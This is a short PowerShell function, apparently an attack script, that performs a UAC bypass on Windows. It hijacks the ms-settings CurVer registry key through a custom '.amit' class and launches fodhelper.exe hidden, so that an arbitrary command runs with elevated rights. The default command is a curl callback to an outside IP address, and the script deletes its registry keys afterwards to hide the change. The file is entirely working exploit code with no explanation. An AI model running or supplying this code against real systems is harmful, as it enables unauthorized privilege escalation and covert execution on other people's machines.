function Bypass { 
    Param (    
        [String]$program = "cmd /c curl http://192.168.25.22/worked"
    )

    New-Item "HKCU:\Software\Classes\.amit\Shell\Open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\.amit\Shell\Open\command" -Name "(default)" -Value $program -Force
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".amit" -Force
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    
    Start-Sleep 3
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.amit\" -Recurse -Force
}
